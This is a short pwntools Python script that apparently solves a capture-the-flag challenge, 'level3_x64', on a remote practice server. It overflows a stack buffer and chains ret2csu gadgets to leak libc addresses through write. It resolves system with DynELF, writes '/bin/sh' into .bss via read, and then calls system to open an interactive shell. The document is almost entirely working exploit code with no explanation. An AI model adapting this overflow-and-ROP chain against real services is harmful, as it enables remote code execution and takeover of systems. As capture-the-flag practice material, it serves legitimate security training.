from pwn import *


p = remote("node4.buuoj.cn", 27951)
pro = ELF("./level3_x64")


# write_p = pro.plt["write"]
write_g = pro.got["write"]
read_g = pro.got["read"]
start = 0x04004F0
pop_rdi_ret = 0x04006b3
mov_call = 0x0400690
pop_six = 0x04006AA
bss_addr = 0x00600A88


# leak
def leak(addr):
    p.recvline()
    pad = cyclic(0x80+0x8)
    pad += p64(pop_six)+p64(0)+p64(1)+p64(write_g)
    pad += p64(8)+p64(addr)+p64(1)+p64(mov_call)
    pad += cyclic(56)+p64(start)
    p.send(pad)
    info = p.recvuntil("Input", drop=True)
    if not info:
        info = b"\x00"
    
    print("leak: ", info)
    return info

d = DynELF(leak, elf=pro)
system = d.lookup("system", "libc")
print("system: ", hex(system))

# read "/bin/sh"
pad = cyclic(0x80+0x8)
pad += p64(pop_six)+p64(0)+p64(1)+p64(read_g)
pad += p64(8)+p64(bss_addr)+p64(0)+p64(mov_call)
pad += cyclic(56)+p64(start)
p.send(pad)
p.send("/bin/sh\x00")

# attack
pad = cyclic(0x80+0x8)
pad += p64(pop_rdi_ret)+p64(bss_addr)+p64(system)
p.send(pad)

p.interactive()

